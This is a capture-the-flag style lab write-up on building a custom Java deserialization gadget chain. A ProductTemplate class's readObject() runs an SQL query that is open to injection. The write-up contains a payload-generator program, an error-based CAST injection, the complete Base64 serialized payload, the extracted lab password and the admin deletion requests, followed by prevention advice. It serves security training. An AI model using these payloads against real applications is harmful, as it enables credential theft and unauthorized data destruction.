# Lab 5: Developing a Custom Gadget Chain for Java Deserialization

## Lab Overview

**Status**: ✅ SOLVED  
**Framework**: Java Servlet Application  
**Serialization Format**: Java Object Serialization  
**Vulnerability**: Insecure deserialization + SQL injection  
**Objective**: Extract administrator password and delete user carlos

---

## Solution Summary

Exploited **Java deserialization combined with SQL injection** in a custom gadget class (`ProductTemplate`). The class implements `Serializable` with a dangerous `readObject()` method that executes unsanitized SQL queries, allowing direct SQL injection through the deserialized object's field values.

**Attack Flow**:
1. Discover source code via HTML comment leak (`/backup/ProductTemplate.java`)
2. Identify SQL injection vulnerability in `ProductTemplate.readObject()`
3. Create malicious Java serialized object with SQL injection payload
4. Trigger deserialization to execute SQL query
5. Extract password from error-based SQL injection message
6. Log in as administrator and delete target user

---

## Vulnerability Analysis

### Source Code: ProductTemplate.java

```java
public class ProductTemplate implements Serializable {
    static final long serialVersionUID = 1L;
    private final String id;
    private transient Product product;

    public ProductTemplate(String id) {
        this.id = id;
    }

    private void readObject(ObjectInputStream inputStream) 
            throws IOException, ClassNotFoundException {
        inputStream.defaultReadObject();

        JdbcConnectionBuilder connectionBuilder = 
            JdbcConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "password"
            ).withAutoCommit();
        
        try {
            Connection connect = connectionBuilder.connect(30);
            // VULNERABLE: Unsanitized string concatenation
            String sql = String.format(
                "SELECT * FROM products WHERE id = '%s' LIMIT 1", 
                id  // ← SQL Injection here!
            );
            Statement statement = connect.createStatement();
            ResultSet resultSet = statement.executeQuery(sql);
            // ... process results
        } catch (SQLException e) {
            throw new IOException(e);
        }
    }
}
```

**Vulnerability**: The `id` field is directly interpolated into SQL query without any parameterized statements or escaping.

### Attack Surface

**When triggered**: During Java deserialization via `ObjectInputStream.readObject()`

**Payload location**: The `id` field of the serialized `ProductTemplate` object

**Execution context**: Database connection with full privileges to PostgreSQL

---

## Exploitation Steps

### Step 1: Source Code Discovery

Located vulnerable source code through HTML comment in `/my-account` page:

```html
<!-- <a href=/backup/AccessTokenUser.java>Example user</a> -->
```

Downloaded both:
- `/backup/AccessTokenUser.java` - Session user class
- `/backup/ProductTemplate.java` - Vulnerable gadget class

### Step 2: Vulnerability Analysis

Identified that `ProductTemplate.readObject()` is called automatically during deserialization and contains SQL injection in this line:

```java
String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
```

### Step 3: SQL Injection Payload Development

Created Java program to generate malicious serialized object:

```java
import data.productcatalog.ProductTemplate;
import java.io.*;
import java.util.Base64;

public class ExploitGenerator {
    public static void main(String[] args) throws Exception {
        // Error-based SQL injection payload
        // Forces CAST error that reveals password in message
        String sqlInjection = 
            "' || (SELECT CAST(password AS int) FROM users " +
            "WHERE username='administrator') || '";
        
        ProductTemplate payload = new ProductTemplate(sqlInjection);
        
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(payload);
        oos.close();
        
        String encoded = Base64.getEncoder()
            .encodeToString(baos.toByteArray());
        System.out.println(encoded);
    }
}
```

### Step 4: SQL Injection Execution

The malicious payload executes this SQL:

```sql
SELECT * FROM products WHERE id = '' || (SELECT CAST(password AS int) 
FROM users WHERE username='administrator') || '' LIMIT 1
```

**Result**: PostgreSQL attempts to cast the password string to integer, triggering an error message that reveals the value:

```
ERROR: invalid input syntax for type integer: "e4cgd1p5qbsv8gp7czks"
```

### Step 5: Password Extraction

Extracted from error message: **`e4cgd1p5qbsv8gp7czks`**

### Step 6: Authentication & Account Deletion

```bash
# Login as administrator
POST /login
username=administrator
password=e4cgd1p5qbsv8gp7czks

# Delete target user
GET /admin/delete?username=carlos
```

---

## Technical Deep Dive

### Why Error-Based SQL Injection Works

PostgreSQL raises errors with detailed messages that include invalid values:

```
ERROR: invalid input syntax for type integer: "actual_password_here"
```

This allows extracting data through error messages without needing to access result sets or UNION queries.

### Deserialization Gadget Chain

```
HTTP Request with malicious cookie
           ↓
ObjectInputStream.readObject()
           ↓
ProductTemplate.readObject() [automatic call]
           ↓
String.format() with SQL injection payload
           ↓
SQL query execution on PostgreSQL
           ↓
CAST error containing password
           ↓
IOException wraps PSQLException
           ↓
Error message sent to client
```

### Why Standard UNION Injection Failed

Initial attempts with UNION SELECT failed due to:
1. **Column type mismatch**: `products` table has integer/numeric first column, but password is text
2. **Column count unknown**: Didn't know exact schema without trial and error

Error-based injection bypassed these issues by leveraging PostgreSQL's type casting errors.

### Java Serialization Format

Generated payload structure:
```
rO0A = Base64 for Java magic bytes (0xACED)
BXNy = Stream version & type info
ACNk = String length (class name)
YXRhLnByb2... = Package name (data.productcatalog)
```

When deserialized, JVM instantiates `ProductTemplate` class and calls `readObject()` automatically.

---

## Key Learnings

### 1. Source Code as Attack Vector
- HTML comments can leak file paths
- Backup directories often contain sensitive source
- Always search `/backup/`, `/.git/`, `/admin/`, etc.

### 2. Custom Gadget Classes
Unlike Labs 1-4 which used known gadget chains (PHP Reflection, Java commons, Symfony):
- Lab 5 required finding **custom application code** with vulnerabilities
- The vulnerability (SQL injection) was in **business logic**, not serialization itself
- Deserialization is the **trigger**, SQL injection is the **payload**

### 3. Error-Based Exfiltration
When standard SQL techniques fail:
- Use type casting to generate errors with data
- Use CAST() to force type mismatches
- PostgreSQL reveals values in error messages
- MySQL has similar `EXTRACTVALUE()`, `UPDATEXML()` functions

### 4. Object Composition
The exploit chain:
1. Attacker controls `id` field when creating `ProductTemplate`
2. `ProductTemplate` is serialized with malicious `id`
3. Server deserializes, calling `readObject()` automatically
4. `readObject()` uses `id` in SQL query
5. SQL injection executes

This is a **custom gadget chain** specific to this application.

---

## Comparison with Previous Labs

| Lab | Deserialization Format | Vulnerability Type | Gadget Source | Complexity |
|-----|------------------------|-------------------|---------------|-----------|
| 1 | PHP serialize() | Reflection RCE | Built-in __wakeup() | ⭐⭐ |
| 2 | Java serialization | Gadget chain (commons) | Apache Commons library | ⭐⭐⭐ |
| 3 | HMAC-signed PHP | Gadget chain (Symfony) | Symfony framework | ⭐⭐⭐⭐ |
| 4 | Ruby Marshal | Complex gadget chain (Gem) | RubyGems library | ⭐⭐⭐⭐⭐ |
| 5 | Java serialization | **Custom gadget + SQL injection** | **Application code** | ⭐⭐⭐⭐ |

Lab 5 is unique because:
- Vulnerable class is **custom application code**, not library
- The gadget **combines deserialization with SQL injection**
- No pre-existing gadget chain needed
- Requires **source code analysis** to find vulnerability

---

## Attack Artifacts

### Payloads Generated

1. **ExploitGenerator.java** - Initial UNION injection attempt (failed)
2. **ExploitGenerator2.java** - Type casting approach (failed) 
3. **ExploitGenerator3.java** - String concatenation (failed)
4. **ExploitGenerator4.java** - Alternative concatenation (failed)
5. **ExploitGenerator5.java** - **Error-based CAST injection (SUCCESS)**

### Final Working Payload

```
rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAUicgfHwgKFNFTEVDVCBDQVNUKHBhc3N3b3JkIEFTIGludCkgRlJPTSB1c2VycyBXSEVSRSB1c2VybmFtZT0nYWRtaW5pc3RyYXRvcicpIHx8ICc=
```

**Decoded SQL Injection Payload**:
```sql
' || (SELECT CAST(password AS int) FROM users WHERE username='administrator') || '
```

**Extracted Credential**: `e4cgd1p5qbsv8gp7czks`

---

## Prevention

### Secure Code

```java
// BAD - Vulnerable to SQL injection
String sql = String.format(
    "SELECT * FROM products WHERE id = '%s' LIMIT 1", 
    id
);

// GOOD - Use prepared statements
String sql = "SELECT * FROM products WHERE id = ? LIMIT 1";
PreparedStatement pstmt = connect.prepareStatement(sql);
pstmt.setString(1, id);
ResultSet resultSet = pstmt.executeQuery();
```

### Other Preventions

1. **Never deserialize untrusted data** - Implement digital signatures
2. **Avoid Serializable in sensitive classes** - Use JSON/Protobuf instead
3. **Disable Java serialization** if possible - Use `@SerializationFilter`
4. **Input validation** - Even with SQL injection fixed, validate `id` format
5. **Source code review** - Check all `readObject()` implementations
6. **Static analysis** - Tools like SpotBugs can detect serialization risks

---

## All 5 Labs Completed!

| Lab | Vulnerability | Status |
|-----|---------------|--------|
| 1 | PHP Object Injection + Reflection | ✅ SOLVED |
| 2 | Java Gadget Chain (ysoserial) | ✅ SOLVED |
| 3 | Symfony + HMAC Bypass | ✅ SOLVED |
| 4 | Ruby Universal Gadget Chain | ✅ SOLVED |
| 5 | Custom Gadget + SQL Injection | ✅ SOLVED |

**Key Insight**: Deserialization vulnerabilities vary significantly by language and framework. Success requires understanding both the serialization mechanism AND the specific gadget chains/vulnerable patterns available in that ecosystem.

---

**Lab 5 Completed**: 2026-01-28  
**Attack Type**: Deserialization + SQL Injection Hybrid  
**Extraction Method**: Error-based SQL injection via type casting  
**Key Lesson**: Source code discovery enables custom gadget chain exploitation
